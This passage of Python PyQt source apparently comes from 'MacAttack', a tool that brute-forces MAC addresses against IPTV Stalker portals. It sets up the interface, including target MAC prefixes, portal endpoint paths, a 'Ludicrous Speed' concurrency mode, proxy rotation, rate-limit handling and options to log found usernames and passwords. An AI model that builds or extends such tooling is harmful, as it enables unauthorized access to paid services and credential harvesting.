        tab_widget.addTab(general_tab, "General")
        tab_widget.addTab(output_tab, "Output")
        tab_widget.addTab(videoplayer_tab, "Video Player")

        layout.addWidget(tab_widget)

        # OUTPUT TAB
        output_label = QLabel("Output Settings")
        output_label.setAlignment(Qt.AlignTop)
        output_layout.addWidget(output_label)
        line2 = QFrame()
        line2.setFrameShape(QFrame.HLine)
        line2.setFrameShadow(QFrame.Sunken)
        output_layout.addWidget(line2)

        # Horizontal layout for the label and spinbox
        buffer_layout = QHBoxLayout()
        buffer_layout.setAlignment(
            Qt.AlignLeft
        )  # Align the layout contents to the left

        # A widget to apply background color
        buffer_widget = QWidget()
        buffer_widget.setLayout(buffer_layout)
        buffer_widget.setStyleSheet("background-color: green;")

        buffer_label = QLabel("Output window buffer")
        buffer_layout.addWidget(buffer_label)
        self.output_buffer_spinbox = QSpinBox()
        self.output_buffer_spinbox.setRange(1, 99999)  # Set max range for the spinbox
        self.output_buffer_spinbox.setValue(2500)  # Set default value
        self.output_buffer_spinbox.setSingleStep(100)  # Increment in steps of 100
        self.output_buffer_spinbox.setFixedWidth(60)  # Set the width of the spinbox
        buffer_layout.addWidget(self.output_buffer_spinbox)
        lines_label = QLabel("lines.")
        buffer_layout.addWidget(lines_label)

        output_layout.addWidget(
            buffer_widget
        )

        output_layout.addItem(
            QSpacerItem(0, 20, QSizePolicy.Minimum, QSizePolicy.Fixed)
        )  # 20px spacer

        # Add to output:" Label
        output_checkbox_width = 260  # Set width of checkboxes
        add_to_output_label = QLabel("Add to output:")
        output_layout.addWidget(add_to_output_label)

        # Create horizontal layout for side-by-side checkboxes
        horizontal_layout_1 = QHBoxLayout()
        horizontal_layout_2 = QHBoxLayout()
        horizontal_layout_3 = (
            QHBoxLayout()
        )  # New layout for Portal location and Max Connections
        horizontal_layout_4 = (
            QHBoxLayout()
        )  # New layout for Date Found and Date Created

        # Deviceids Output and Backend info (side by side)
        self.deviceid_output_checkbox = QCheckBox(
            "Device IDs. (Serial Number, IDs, etc.)"
        )
        self.backend_output_checkbox = QCheckBox(
            "Backend Info (if different from portal)"
        )
        self.deviceid_output_checkbox.setFixedWidth(output_checkbox_width)
        self.backend_output_checkbox.setFixedWidth(output_checkbox_width)
        horizontal_layout_1.addWidget(self.deviceid_output_checkbox)
        horizontal_layout_1.addWidget(self.backend_output_checkbox)
        # Set alignment for horizontal layout
        horizontal_layout_1.setAlignment(Qt.AlignLeft)
        output_layout.addLayout(horizontal_layout_1)

        # IP addresses and Portal Location/Timezone (side by side)
        self.ip_address_output_checkbox = QCheckBox("IP Addresses")
        self.location_output_checkbox = QCheckBox(
            "Location/Timezone (IP address req'd)"
        )
        self.ip_address_output_checkbox.setFixedWidth(output_checkbox_width)
        self.location_output_checkbox.setFixedWidth(output_checkbox_width)
        horizontal_layout_2.addWidget(self.ip_address_output_checkbox)
        horizontal_layout_2.addWidget(self.location_output_checkbox)
        # Set alignment for horizontal layout
        horizontal_layout_2.setAlignment(Qt.AlignLeft)
        output_layout.addLayout(horizontal_layout_2)

        # Usernames and Passwords and Max Connections (side by side)
        self.username_output_checkbox = QCheckBox("Username/Password (if found)")
        self.max_connections_output_checkbox = QCheckBox("Max Connections (if found)")
        self.username_output_checkbox.setFixedWidth(output_checkbox_width)
        self.max_connections_output_checkbox.setFixedWidth(output_checkbox_width)
        horizontal_layout_3.addWidget(self.username_output_checkbox)
        horizontal_layout_3.addWidget(self.max_connections_output_checkbox)
        # Set alignment for horizontal layout
        horizontal_layout_3.setAlignment(Qt.AlignLeft)
        output_layout.addLayout(horizontal_layout_3)

        # Proxy used (underneath Portal location and timezone)
        self.proxy_used_output_checkbox = QCheckBox("Proxy Used")
        self.proxy_used_output_checkbox.setFixedWidth(output_checkbox_width)

        # Checkbox for Proxy Location
        self.proxy_location_output_checkbox = QCheckBox(
            "Proxy Location (Proxy Used Req'd)"
        )
        self.proxy_location_output_checkbox.setFixedWidth(output_checkbox_width)

        proxy_layout = QHBoxLayout()
        proxy_layout.addWidget(self.proxy_used_output_checkbox)
        proxy_layout.addWidget(self.proxy_location_output_checkbox)
        proxy_layout.setAlignment(Qt.AlignLeft)
        
        output_layout.addLayout(proxy_layout)

        # Date Found with Date Created (side by side)
        self.datefound_output_checkbox = QCheckBox("Date Found")
        self.date_created_output_checkbox = QCheckBox("Date Created (if found)")
        self.datefound_output_checkbox.setFixedWidth(output_checkbox_width)
        self.date_created_output_checkbox.setFixedWidth(output_checkbox_width)
        horizontal_layout_4.addWidget(self.datefound_output_checkbox)
        horizontal_layout_4.addWidget(self.date_created_output_checkbox)
        # Set alignment for horizontal layout
        horizontal_layout_4.setAlignment(Qt.AlignLeft)
        output_layout.addLayout(horizontal_layout_4)

        # Layout for Playlist/Genres and VOD List checkboxes
        playlist_genres_layout = QHBoxLayout()
        playlist_genres_layout.setAlignment(Qt.AlignLeft)

        # Playlist/Genres checkbox
        self.list_genres_checkbox = QCheckBox("Playlist/Genres")
        self.list_genres_checkbox.setFixedWidth(output_checkbox_width)

        # VOD List checkbox
        self.vod_list_checkbox = QCheckBox("VOD Categories")
        self.vod_list_checkbox.setFixedWidth(output_checkbox_width)

        playlist_genres_layout.addWidget(self.list_genres_checkbox)
        playlist_genres_layout.addWidget(self.vod_list_checkbox)

        output_layout.addLayout(playlist_genres_layout)


        output_layout.addItem(
            QSpacerItem(0, 20, QSizePolicy.Minimum, QSizePolicy.Fixed)
        )  # 20px spacer

        # Single output file option (no width change)
        self.singleoutputfile_checkbox = QCheckBox(
            "Single output file.\n(Output will be saved in MacAttackOutput.txt.)"
        )
        self.singleoutputfile_checkbox.setChecked(True)
        output_layout.addWidget(self.singleoutputfile_checkbox)

        # VIDEO PLAYER TAB
        videoplayer_label = QLabel("Video Player Settings")
        videoplayer_label.setAlignment(Qt.AlignTop)
        videoplayer_layout.addWidget(videoplayer_label)
        line3 = QFrame()
        line3.setFrameShape(QFrame.HLine)
        line3.setFrameShadow(QFrame.Sunken)
        videoplayer_layout.addWidget(line3)
        self.autoloadmac_checkbox = QCheckBox(
            "Load MAC into the player tab instantly when discovered"
        )
        videoplayer_layout.addWidget(self.autoloadmac_checkbox)
        self.autopause_checkbox = QCheckBox("Pause the video when switching tabs")
        videoplayer_layout.addWidget(self.autopause_checkbox)
        videoplayer_layout.addSpacing(50)  # space before tips
        # "Tips" label
        tips_label = QLabel("Tips")
        tips_label.setAlignment(Qt.AlignTop)
        videoplayer_layout.addWidget(tips_label)
        # a line under the "Tips" label
        line4 = QFrame()
        line4.setFrameShape(QFrame.HLine)
        line4.setFrameShadow(QFrame.Sunken)
        videoplayer_layout.addWidget(line4)
        # The list of tips
        tips_text = QLabel(
            "<b>Video Controls:</b><br>"
            "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mouseclick/Space Bar - Toggle Pause<br>"
            "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Doubleclick/ESC - Toggle Fullscreen<br><br>"
            "<br>"
        )
        tips_text.setAlignment(Qt.AlignTop)
        videoplayer_layout.addWidget(tips_text)
        tab_widget.addTab(general_tab, "General")
        tab_widget.addTab(output_tab, "Output")
        tab_widget.addTab(videoplayer_tab, "VideoPlayer")
        # a line under the tabs
        tab_line = QFrame()
        tab_line.setFrameShape(QFrame.HLine)
        tab_line.setFrameShadow(QFrame.Sunken)
        layout.addWidget(tab_widget)
        # Set the main layout
        Settings_frame.setLayout(layout)

        # horizontal layout for the Defaults button and version label
        bottom_layout = QHBoxLayout()

        # "Defaults" button and align it to the left
        defaults_button = QPushButton("Defaults")
        defaults_button.setFixedSize(80, 25)  # Adjust size as needed
        defaults_button.clicked.connect(
            self.factory_reset
        )  # Connect the button to the factory_reset function
        bottom_layout.addWidget(defaults_button, alignment=Qt.AlignLeft)

        # label for the version and align it to the right
        version_label = QLabel(f"MacAttack v{VERSION}")
        version_label.setAlignment(Qt.AlignBottom | Qt.AlignRight)
        version_label.setStyleSheet("font-size: 10px; color: gray;")
        bottom_layout.addWidget(version_label, alignment=Qt.AlignRight)

        layout.addLayout(bottom_layout)

    def on_save_pool_clicked(self):
        file_name, _ = QFileDialog.getSaveFileName(
            self, "Save Pool", "MacAddresses.txt", "Text Files (*.txt);;All Files (*)"
        )

        if file_name:
            self.worker = SavePoolWorker(self.mac_dict, file_name)
            self.worker.save_complete.connect(self.on_save_complete)
            self.save_pool_button.setText("Saving File...")
            self.worker.start()

    def on_save_complete(self):
        self.save_pool_button.setText("Save Pool to a file")

    def custommac_random_checkbox_func(self, state):
        # When the checkbox is checked
        if state == Qt.Checked:
            if self.mac_dict:  # If mac_dict isn't empty
                self.custom_random_mac_checkbox.setText(
                    "Please wait... Shuffling list."
                )
                QApplication.processEvents()
                # Shuffle the mac_dict
                mac_list = list(self.mac_dict)
                random.shuffle(mac_list)  # Shuffle the MAC list
                self.mac_dict = deque(
                    mac_list
                )  # Update mac_dict with the shuffled list
                self.custom_random_mac_checkbox.setText("Randomize Mac addresses")

        # When the checkbox is unchecked
        else:
            if self.mac_dict:
                self.custom_random_mac_checkbox.setText(
                    "Please wait... Reloading list."
                )
                QApplication.processEvents()
                # Get the text from the mac_file_label
                file_path = self.mac_file_label.text()

                # Strip the phrase "Selected File: " from the file_path
                file_path = file_path.replace("Selected File: ", "").strip()

                # Call load_mac_file with the cleaned file_path
                self.load_mac_file(file_path)
                self.custom_random_mac_checkbox.setText("Randomize Mac addresses")

    def toggle_custom_macs_options(self, state):
        logging.info("toggled custom mac")

        if state == Qt.Checked:
            self.use_custom_macs_checkbox.setText(
                "Enable Custom MAC Addresses\n"
                "Select a file with a list of MAC addresses or a MacAttackOutput file."
            )
            self.prefer_speed_radio.setVisible(True)
            self.prefer_accuracy_radio.setVisible(True)
            self.file_select_button.setVisible(True)
            self.mac_file_label.setVisible(True)
            self.pool_label.setVisible(True)
            self.macs_in_mem_label.setVisible(True)
            self.custom_random_mac_checkbox.setVisible(True)
            self.save_pool_button.setVisible(True)

        else:
            self.mac_file_label.setText("No file selected")
            self.macs_in_mem_label.setText("0")
            self.mac_dict.clear()
            self.use_custom_macs_checkbox.setText("Enable Custom MAC Addresses")
            self.prefer_speed_radio.setVisible(False)
            self.prefer_accuracy_radio.setVisible(False)
            self.file_select_button.setVisible(False)
            self.mac_file_label.setVisible(False)
            self.pool_label.setVisible(False)
            self.macs_in_mem_label.setVisible(False)
            self.custom_random_mac_checkbox.setVisible(False)
            self.save_pool_button.setVisible(False)

    def select_file(self):
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(
            None, "Mac Addresses List", "", "All Files (*)"
        )
        if file_path:
            self.mac_file = file_path
            self.mac_file_label.setText(f"Selected File: {self.mac_file}")
            self.load_mac_file(file_path)

    def load_mac_file(self, file_path):
        self.mac_dict.clear()  # Empty the Pool
        unique_macs = set()

        try:
            with open(file_path, "r", encoding="utf-8") as file:
                lines = file.readlines()

                # Check for "MAC Addr:" lines
                contains_mac_addr_phrase = any("MAC Addr:" in line for line in lines)

                for line in lines:
                    line = line.strip()
                    if contains_mac_addr_phrase:
                        if line.startswith("MAC Addr:"):
                            mac = line.replace("MAC Addr:", "").strip()
                            if mac:  # Ensure the MAC address isn't empty
                                unique_macs.add(mac)
                    else:  # Each line is assumed a mac address
                        if line:  # Ignore empty lines
                            unique_macs.add(line)

                # Update mac_dict with the MAC addresses
                self.mac_dict = deque(unique_macs)

                logging.info("MAC addresses loaded successfully.")

                # Update the macs_in_mem label
                self.macattack_update_mac_count()

                if self.custom_random_mac_checkbox.checkState() == Qt.Checked:
                    if self.mac_dict:  # If mac_dict isn't empty
                        self.custom_random_mac_checkbox.setText(
                            "Please wait... Shuffling list."
                        )
                        QApplication.processEvents()
                        # Shuffle the mac_dict
                        mac_list = list(self.mac_dict)
                        random.shuffle(mac_list)  # Shuffle the MAC list
                        self.mac_dict = deque(
                            mac_list
                        )  # Update mac_dict with the shuffled list
                        self.custom_random_mac_checkbox.setText(
                            "Randomize Mac addresses"
                        )

        except UnicodeDecodeError as e:
            logging.error(f"Encoding error occurred: {e}. Trying with 'latin-1'.")
            try:
                with open(file_path, "r", encoding="latin-1") as file:
                    lines = file.readlines()
                    # Same processing logic here as above
                    contains_mac_addr_phrase = any(
                        "MAC Addr:" in line for line in lines
                    )
                    for line in lines:
                        line = line.strip()
                        if contains_mac_addr_phrase:
                            if line.startswith("MAC Addr:"):
                                mac = line.replace("MAC Addr:", "").strip()
                                if mac:
                                    unique_macs.add(mac)
                        else:
                            if line:
                                unique_macs.add(line)
                    self.mac_dict = deque(unique_macs)
                    logging.info(
                        "MAC addresses loaded successfully with 'latin-1' encoding."
                    )
                    self.macattack_update_mac_count()
            except Exception as e:
                logging.error(
                    f"An error occurred while loading MAC addresses with fallback encoding: {e}"
                )
        except FileNotFoundError:
            logging.error(f"File not found: {file_path}")
        except Exception as e:
            logging.error(
                f"An unexpected error occurred while loading MAC addresses: {e}"
            )

    def enable_ludicrous_speed(self):
        if self.ludicrous_speed_checkbox.isChecked():
            # Update text and styling for checked state
            self.ludicrous_speed_checkbox.setText(
                "     🚨Ludicrous Speed Activated!🚨 \nRunning at high speeds can crash the app."
            )
            # add a line to stretch the check for updates box
            self.dont_update_checkbox.setText("Don't check for updates.\n")
            self.ludicrous_speed_checkbox.setStyleSheet(
                "QCheckBox { background-color: black; color: red; }"
            )
            self.concurrent_tests.setRange(1, 1000)
            # self.proxy_concurrent_tests.setRange(1, 1000)
        else:
            # Reset text and styling for unchecked state
            self.ludicrous_speed_checkbox.setText("Enable Ludicrous Speed!")
            self.ludicrous_speed_checkbox.setStyleSheet(
                "QCheckBox { background-color: #666666; color: white; }"
            )
            # add a line to stretch the check for updates box
            self.dont_update_checkbox.setText("Don't check for updates.")
            self.concurrent_tests.setRange(1, 100)  # Default range
            # self.proxy_concurrent_tests.setRange(1, 100)

    def update_hits_label(self, text):
        """Update the MAC address label in the main thread."""
        self.hits_label.setText(text)
    def update_mac_label(self, text):
        """Update the MAC address label in the main thread."""
        self.brute_mac_label.setText(text)

    def update_output_text(self, text):
        """Update the QTextEdit widget in the main thread."""
        self.output_text.append(text)

    def update_error_text(self, text):
        """Update the QTextEdit widget in the main thread."""
        if text != "clearall":
            self.error_text.append(text)
        else:
            self.error_text.clear()

    def build_mac_attack_gui(self, parent):
        layout = QVBoxLayout(parent)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Combined layout for IPTV link, Speed, and Start/Stop buttons
        combined_layout = QHBoxLayout()
        combined_layout.setContentsMargins(0, 0, 0, 0)
        combined_layout.setSpacing(10)

        left_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        combined_layout.addItem(left_spacer)
        layout.addSpacing(15)  # Adds space

        # IPTV link input
        self.iptv_link_label = QLabel("IPTV link:")
        self.iptv_link_entry = QLineEdit("http://evilvir.us.streamtv.to:8080/c/")
        combined_layout.addWidget(self.iptv_link_label)
        combined_layout.addWidget(self.iptv_link_entry)

        # Speed input (Slider)
        self.speed_label = QLabel("Speed:")
        self.concurrent_tests = QSlider(Qt.Horizontal)
        self.concurrent_tests.setRange(1, 100)
        self.concurrent_tests.setValue(10)
        self.concurrent_tests.setTickPosition(QSlider.TicksBelow)
        self.concurrent_tests.setTickInterval(1)
        combined_layout.addWidget(self.speed_label)
        combined_layout.addWidget(self.concurrent_tests)

        # Dynamic label to show current speed value
        self.speed_value_label = QLabel(str(self.concurrent_tests.value()))
        combined_layout.addWidget(self.speed_value_label)

        # Connect slider value change to update the dynamic label
        self.concurrent_tests.valueChanged.connect(
            lambda value: self.speed_value_label.setText(str(value))
        )

        # Start/Stop buttons
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.TestDrive)
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.GiveUp)
        combined_layout.addWidget(self.start_button)
        combined_layout.addWidget(self.stop_button)
        self.start_button.setDisabled(False)
        self.stop_button.setDisabled(True)

        # Button styles
        self.stop_button.setStyleSheet(
            """
            QPushButton:disabled {
                background-color: grey;
            }
            QPushButton:enabled {
                background-color: red;
            }
        """
        )
        self.start_button.setStyleSheet(
            """
            QPushButton:disabled {
                background-color: grey;
            }
            QPushButton:enabled {
                background-color: green;
            }
        """
        )

        right_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        combined_layout.addItem(right_spacer)

        layout.addLayout(combined_layout)
        layout.addSpacing(15)  # Adds space

        # Dropdown and MAC label layout
        dropdown_label_layout = QHBoxLayout()
        dropdown_label_layout.setContentsMargins(0, 0, 0, 0)
        dropdown_label_layout.setSpacing(0)

        # Spacer to the left of IPTV type label
        # left_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        dropdown_label_layout.addItem(left_spacer)
        dropdown_label_layout.addSpacing(0)  # Adds space

        # IPTV type input
        self.iptv_type_label = QLabel("Type:")
        dropdown_label_layout.addWidget(self.iptv_type_label)

        # Dropdown box
        self.dropdown_box = QComboBox()
        self.dropdown_box.addItems(["Autodetect", "Portal", "Stalker_Portal"])
        self.dropdown_box.currentIndexChanged.connect(
            self.set_portal_type_detected
        )  # Connect signal to function
        dropdown_label_layout.addWidget(self.dropdown_box, alignment=Qt.AlignLeft)

        dropdown_label_layout.addItem(QSpacerItem(20, 0))  # 10px vertical space

        # Prefix dropdown and label
        self.prefix_label = QLabel("Prefix:")
        dropdown_label_layout.addWidget(self.prefix_label)

        self.prefix_dropdown = QComboBox()
        prefixes = sorted([
            '00:2A:01:',
            'D4:CF:F9:',
            '33:44:CF:',
            '10:27:BE:',
            'A0:BB:3E:',
            '55:93:EA:',
            '04:D6:AA:',
            '11:33:01:',
            '00:1C:19:',
            '1A:00:6A:',
            '1A:00:FB:',
            '00:A1:79:',
            '00:1B:79:',
            '00:2A:79:',
            '00:1A:79: (default)'
        ])
        self.prefix_dropdown.addItems(prefixes)
        dropdown_label_layout.addWidget(self.prefix_dropdown)
        self.prefix_dropdown.currentIndexChanged.connect(self.update_customprefix)

        # Hits label
        dropdown_label_layout.addSpacing(20)  # Adds space
        self.hits_label = QLabel("Hits: 0")
        dropdown_label_layout.addWidget(self.hits_label, alignment=Qt.AlignCenter)
        dropdown_label_layout.addSpacing(20)  # Adds space
        
        # Center spacer for label alignment
        center_spacer = QSpacerItem(0, 0, QSizePolicy.Expanding, QSizePolicy.Minimum)
        dropdown_label_layout.addItem(center_spacer)


        # MAC address label
        self.brute_mac_label = QLabel("")
        dropdown_label_layout.addWidget(self.brute_mac_label, alignment=Qt.AlignCenter)

        # Right spacer to balance the layout
        right_spacer = QSpacerItem(20, 0, QSizePolicy.Expanding, QSizePolicy.Minimum)
        dropdown_label_layout.addItem(right_spacer)
        dropdown_label_layout.addItem(right_spacer)

        layout.addLayout(dropdown_label_layout)
        layout.addSpacing(15)  # Adds space

        # Output Text Area
        self.output_text = QTextEdit()
        self.output_text.setStyleSheet(
            """
            color: white;
            background-color:  #10273d;
            border: 12px solid  #2E2E2E;
            """
        )
        self.output_text.setPlainText("Output LOG:\nResults will appear here.\n")
        self.output_text.setReadOnly(True)
        monospace_font = QFont("Lucida Console", 10)
        self.output_text.setFont(monospace_font)
        layout.addWidget(self.output_text)

        # Keep the output log to a maximum of output_history_buffer lines
        self.output_text.textChanged.connect(self.trim_output_log)

        # Error Log Area
        self.error_text = QTextEdit()
        self.error_text.setStyleSheet(
            """
            color: grey;
            background-color:  #451e1c;
            border-top: 0px;
            border-left: 12px solid  #2E2E2E;
            border-right: 12px solid  #2E2E2E;
            border-bottom: 0px;
            """
        )
        self.error_text.setHtml("")
        self.error_text.setHtml(
            """
            Error LOG:<br>It's normal for errors to appear down here.
            """
        )
        self.error_text.setReadOnly(True)
        self.error_text.setFont(monospace_font)
        self.error_text.setVerticalScrollBarPolicy(
            Qt.ScrollBarAlwaysOff
        )  # Disable vertical scrollbar
        self.error_text.setHorizontalScrollBarPolicy(
            Qt.ScrollBarAlwaysOff
        )  # Disable horizontal scrollbar
        self.error_text.setSizePolicy(
            QSizePolicy.Expanding, QSizePolicy.Expanding
        )  # Let it grow with content
        layout.addWidget(self.error_text)
        layout.addSpacing(15)  # Adds space

        self.error_text.textChanged.connect(self.trim_error_log)

        self.error_text.setReadOnly(True)
        self.error_text.setFont(monospace_font)
        layout.addWidget(self.error_text)
        layout.addSpacing(10)  # Adds space


    def update_customprefix(self):
        # Update self.customprefix with the currently selected prefix
        self.customprefix = self.prefix_dropdown.currentText()
        self.customprefix = self.customprefix.replace(' (default)', '') #remove default
        logging.info(f"Updated customprefix: {self.customprefix}")


    def set_portal_type_detected(self, index):
        global portaltype
        # Get the text of the selected item
        selected_item = self.dropdown_box.currentText()

        # Log or process the selected portal type
        if selected_item == "Autodetect":
            logging.info("Portal type selected: AUTODETECT")
            portaltype = None
            # Add any logic specific to Portal here
        elif selected_item == "Portal":
            logging.info("Portal type selected: Portal")
            portaltype = "portal.php"
            # Add any logic specific to Portal here
        elif selected_item == "Stalker_Portal":
            logging.info("Portal type selected: Stalker Portal")
            portaltype = "stalker_portal/server/load.php"
            # Add any logic specific to Stalker Portal here
        else:
            logging.info(f"Unknown portal type selected: {selected_item}")

    def trim_output_log(self):
        """Trims the output log to retain only the last 'output_history_buffer' lines. Runs no more than once per second to avoid deleting too many lines."""

        current_time = time.time()  # Get the current time in seconds

        # If it has been less than 1 second since the last trim, do nothing
        if current_time - self.last_trim_time < 1:
            return

        # Update the last trim time
        self.last_trim_time = current_time

        self.output_history_buffer = self.output_buffer_spinbox.value()
        document = self.output_text.document()
        block_count = document.blockCount()

        if block_count > self.output_history_buffer:
            cursor = QTextCursor(document)
            cursor.movePosition(QTextCursor.Start)  # Go to the beginning
            for _ in range(block_count - self.output_history_buffer):
                cursor.select(QTextCursor.BlockUnderCursor)
                cursor.removeSelectedText()
                cursor.deleteChar()  # Ensure newline is removed

    def trim_error_log(self):
        """Trims the error log to retain only the last 100 lines. Runs no more than once per second to avoid deleting too many lines."""

        current_time = time.time()  # Get the current time in seconds

        # If it has been less than 1 second since the last trim, do nothing
        if current_time - self.last_error_trim_time < 1:
            return

        # Update the last trim time
        self.last_error_trim_time = current_time

        self.error__history_buffer = 100  # Keep only the last 100 lines
        document = self.error_text.document()
        block_count = document.blockCount()

        if block_count > self.error__history_buffer:
            cursor = QTextCursor(document)
            cursor.movePosition(QTextCursor.Start)  # Go to the beginning
            for _ in range(block_count - self.error__history_buffer):
                cursor.select(QTextCursor.BlockUnderCursor)
                cursor.removeSelectedText()
                cursor.deleteChar()  # Ensure newline is removed

    def factory_reset(self):
        """Delete the configuration file, reset settings to defaults, and reload settings."""
        reply = QMessageBox.question(
            self,
            "Factory Reset",
            "Are you sure? This will reset everything. The output file will not be deleted.",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No,
        )

        if reply == QMessageBox.No:
            logging.debug("Factory reset canceled by the user.")
            return  # Exit the function if the user selects "No"

        user_dir = os.path.expanduser("~")
        file_path = os.path.join(user_dir, "evilvir.us", "MacAttack.ini")
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                logging.debug("Configuration file deleted for factory reset.")
            else:
                logging.debug("No configuration file found to delete.")

            # Reset UI elements to default values
            self.iptv_link_entry.setText(
                "http://evilvir.us.streamtv.to:8080/c/"
            )  # Set the default IPTV link
            self.concurrent_tests.setValue(10)
            self.hostname_input.setText("")
            self.mac_input.setText("")
            self.autoloadmac_checkbox.setChecked(False)
            self.autostop_checkbox.setChecked(False)
            self.successsound_checkbox.setChecked(False)
            self.autopause_checkbox.setChecked(True)
            self.proxy_enabled_checkbox.setChecked(False)
            self.ludicrous_speed_checkbox.setChecked(False)
            self.deviceid_output_checkbox.setChecked(False)
            self.ip_address_output_checkbox.setChecked(False)
            self.location_output_checkbox.setChecked(False)
            self.backend_output_checkbox.setChecked(False)
            self.username_output_checkbox.setChecked(False)
            self.datefound_output_checkbox.setChecked(False)
            self.max_connections_output_checkbox.setChecked(False)
            self.date_created_output_checkbox.setChecked(False)
            self.proxy_used_output_checkbox.setChecked(False)
            self.proxy_location_output_checkbox.setChecked(False)
            self.singleoutputfile_checkbox.setChecked(True)
            self.proxy_location_output_checkbox.setChecked(False)
            self.proxy_remove_errorcount.setValue(5)
            self.proxy_input.setText("")
            self.output_buffer_spinbox.setValue(2500)
            self.dont_update_checkbox.setChecked(False)
            self.use_custom_macs_checkbox.setChecked(False)
            self.update_hourly_checkbox.setChecked(False)
            self.list_genres_checkbox.setChecked(False)
            self.vod_list_checkbox.setChecked(False)
            self.proxy_altspeed_checkbox.setChecked(False)
            self.remove_for_seconds_spinbox.setValue(30)

            logging.debug("UI reset to default values.")
        except Exception as e:
            logging.error(f"Error while performing factory reset: {e}")
        finally:
            self.load_settings()  # Reload settings to ensure consistency

    def SaveTheDay(self):
        """Save user settings, including window geometry, active tab, and other preferences to the configuration file."""
        user_dir = os.path.expanduser("~")
        os.makedirs(os.path.join(user_dir, "evilvir.us"), exist_ok=True)
        file_path = os.path.join(user_dir, "evilvir.us", "MacAttack.ini")
        config = configparser.ConfigParser()
        config["Settings"] = {
            "update_hourly": str(
                self.update_hourly_checkbox.isChecked()
            ),  # Save Update Hourly checkbox state
            "mac_file": self.mac_file_label.text(),  # Save label text
            "custom_random_mac": str(
                self.custom_random_mac_checkbox.isChecked()
            ),  # Save the random MAC checkbox state
            "prefer_speed": str(
                self.prefer_speed_radio.isChecked()
            ),  # Save the state of the 'Prefer Speed' radio button
            "prefer_accuracy": str(
                self.prefer_accuracy_radio.isChecked()
            ),  # Save the state of the 'Prefer Accuracy' radio button
            "iptv_link": self.iptv_link_entry.text(),
            "concurrent_tests": self.concurrent_tests.value(),
            "hostname": self.hostname_input.text(),
            "mac": self.mac_input.text(),
            "autoloadmac": str(self.autoloadmac_checkbox.isChecked()),
            "autostop": str(self.autostop_checkbox.isChecked()),
            "successsound": str(self.successsound_checkbox.isChecked()),
            "autopause": str(self.autopause_checkbox.isChecked()),
            "active_tab": str(self.tabs.currentIndex()),
            "proxy_enabled": str(self.proxy_enabled_checkbox.isChecked()),
            "proxy_list": self.proxy_textbox.toPlainText(),
            # "proxy_concurrent_tests": str(self.proxy_concurrent_tests.value()),
            "proxy_remove_errorcount": str(self.proxy_remove_errorcount.value()),
            "ludicrous_speed": str(self.ludicrous_speed_checkbox.isChecked()),
            "deviceid_output": str(self.deviceid_output_checkbox.isChecked()),
            "ip_address_output": str(self.ip_address_output_checkbox.isChecked()),
            "location_output": str(self.location_output_checkbox.isChecked()),
            "backend_output": str(self.backend_output_checkbox.isChecked()),
            "username_output": str(self.username_output_checkbox.isChecked()),
            "datefound_output": str(self.datefound_output_checkbox.isChecked()),
            "singleoutputfile": str(self.singleoutputfile_checkbox.isChecked()),
            "max_connections_output": str(
                self.max_connections_output_checkbox.isChecked()
            ),
            "date_created_output": str(self.date_created_output_checkbox.isChecked()),
            "proxy_used_output": str(self.proxy_used_output_checkbox.isChecked()),
            "proxy_input": self.proxy_input.text(),
            "output_buffer": str(self.output_buffer_spinbox.value()),
            "dont_update": str(self.dont_update_checkbox.isChecked()),
            "proxy_location_output": str(
                self.proxy_location_output_checkbox.isChecked()
            ),
            "use_custom_macs": str(self.use_custom_macs_checkbox.isChecked()),
            "ratelimit_timeout": str(self.remove_for_seconds_spinbox.value()),
            "list_genres": str(self.list_genres_checkbox.isChecked()),
            "list_vod": str(self.vod_list_checkbox.isChecked()),
            "alt_proxy_speed": str(self.proxy_altspeed_checkbox.isChecked()),
        }
        config["Window"] = {
            "width": self.width(),
            "height": self.height(),
            "x": self.x(),
            "y": self.y(),
        }
        with open(file_path, "w") as configfile:
            config.write(configfile)
        logging.debug("Settings saved.")

    def load_settings(self):
        """Load user settings from the configuration file and apply them to the UI elements, including the active tab."""
        user_dir = os.path.expanduser("~")
        file_path = os.path.join(user_dir, "evilvir.us", "MacAttack.ini")
        config = configparser.ConfigParser()
        if os.path.exists(file_path):
            config.read(file_path)
            # Load UI settings
            self.update_hourly_checkbox.setChecked(
                config.get("Settings", "update_hourly", fallback="False") == "True"
            )
            self.mac_file_label.setText(
                config.get(
                    "Settings", "mac_file", fallback="No file selected"
                )  # Restore the label text
            )
            self.custom_random_mac_checkbox.setChecked(
                config.get("Settings", "custom_random_mac", fallback="False") == "True"
            )
            self.prefer_accuracy_radio.setChecked(
                config.get("Settings", "prefer_accuracy", fallback="True") == "True"
            )
            self.prefer_speed_radio.setChecked(
                config.get("Settings", "prefer_speed", fallback="False") == "True"
            )
            self.iptv_link_entry.setText(
                config.get("Settings", "iptv_link", fallback="")
            )
            self.hostname_input.setText(config.get("Settings", "hostname", fallback=""))
            self.mac_input.setText(config.get("Settings", "mac", fallback=""))
            # Load checkbox states
            self.autoloadmac_checkbox.setChecked(
                config.get("Settings", "autoloadmac", fallback="False") == "True"
            )
            self.autostop_checkbox.setChecked(
                config.get("Settings", "autostop", fallback="False") == "True"
            )
            self.successsound_checkbox.setChecked(
                config.get("Settings", "successsound", fallback="False") == "True"
            )
            self.autopause_checkbox.setChecked(
                config.get("Settings", "autopause", fallback="True") == "True"
            )
            self.proxy_enabled_checkbox.setChecked(
                config.get("Settings", "proxy_enabled", fallback="False") == "True"
            )
            self.ludicrous_speed_checkbox.setChecked(
                config.get("Settings", "ludicrous_speed", fallback="False") == "True"
            )
            self.concurrent_tests.setValue(
                config.getint("Settings", "concurrent_tests", fallback=10)
            )
            self.deviceid_output_checkbox.setChecked(
                config.get("Settings", "deviceid_output", fallback="False") == "True"
            )
            self.ip_address_output_checkbox.setChecked(
                config.get("Settings", "ip_address_output", fallback="False") == "True"
            )
            self.location_output_checkbox.setChecked(
